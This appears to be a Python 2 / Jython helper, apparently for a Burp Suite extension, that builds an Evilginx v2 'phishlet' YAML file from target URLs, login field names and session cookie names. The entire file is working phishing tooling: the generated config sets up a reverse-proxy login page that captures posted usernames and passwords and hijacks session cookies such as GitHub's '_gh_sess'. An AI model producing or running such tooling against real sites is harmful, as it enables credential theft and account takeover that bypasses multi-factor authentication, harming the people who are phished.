from urlparse import urlparse


def indent(level):
    return '  ' * level


def build_phishlet_yaml(urls, creds, cookies,
                        author='@Burginx',
                        min_ver='2.3.0',
                        sub_filters=None):
    """
    Build an advanced Phishlet YAML according to Evilginx v2 format.

    Args:
      urls (list): URL strings or java.net.URL objects.
      creds (list): Credential keys (e.g., ['login', 'password']).
      cookies (list): Cookie names to deliver (e.g., ['_gh_sess']).
      author (str): Author field.
      min_ver (str): Minimum Evilginx version.
      sub_filters (list): List of dicts defining sub_filters.

    Returns:
      str: Formatted Phishlet YAML.
    """
    # Normalize URLs to strings
    str_urls = []
    try:
        from java.net import URL
    except ImportError:
        URL = None
    for u in urls:
        if URL and isinstance(u, URL):
            str_urls.append(u.toString())
        else:
            str_urls.append(u)
    urls = str_urls

    if not urls:
        return "# No URLs provided"

    # Derive primary domain and path
    first = urlparse(urls[0])
    primary_domain = first.hostname
    primary_path = first.path or '/'

    # Build proxy_hosts entries
    proxy_hosts = [
        {
            'phish_sub': '',
            'orig_sub': '',
            'domain': primary_domain,
            'session': True,
            'is_landing': True,
        }
    ]

    # Begin YAML
    lines = []
    lines.append("author: '%s'" % author)
    lines.append("min_ver: '%s'" % min_ver)

    # proxy_hosts
    lines.append("proxy_hosts:")
    for host in proxy_hosts:
        entry = (
            "- {phish_sub: '%s', orig_sub: '%s', domain: '%s', session: %s, is_landing: %s}" %
            (
                host['phish_sub'], host['orig_sub'], host['domain'],
                str(host['session']).lower(), str(host['is_landing']).lower()
            )
        )
        lines.append(indent(1) + entry)

    # sub_filters
    lines.append("")
    lines.append("sub_filters:")
    if sub_filters:
        for sf in sub_filters:
            entry = (
                "- {triggers_on: '%s', orig_sub: '%s', domain: '%s', search: '%s', replace: '%s', mimes: %s}" %
                (
                    sf.get('triggers_on',''), sf.get('orig_sub',''), sf.get('domain',''),
                    sf.get('search',''), sf.get('replace',''), sf.get('mimes',[])
                )
            )
            lines.append(indent(1) + entry)
    else:
        lines.append(indent(1) + '[]')

    # auth_tokens
    lines.append("")
    lines.append("auth_tokens:")
    lines.append(indent(1) + "- domain: '.%s'" % primary_domain)
    if cookies:
        keys = ", ".join("'%s'" % ck for ck in cookies)
        lines.append(indent(2) + "keys: [%s]" % keys)
    else:
        lines.append(indent(2) + "keys: []")

    # credentials
    lines.append("")
    lines.append("credentials:")
    for idx, key in enumerate(creds):
        name = 'username' if idx == 0 else 'password' if idx == 1 else 'field%d' % idx
        lines.append(indent(1) + "%s:" % name)
        lines.append(indent(2) + "key: '%s'" % key)
        lines.append(indent(2) + "search: '(.*)'")
        lines.append(indent(2) + "type: 'post'")

    # login
    lines.append("")
    lines.append("login:")
    lines.append(indent(1) + "domain: '%s'" % primary_domain)
    lines.append(indent(1) + "path: '%s'" % primary_path)

    # Join with newline
    return "\n".join(lines)
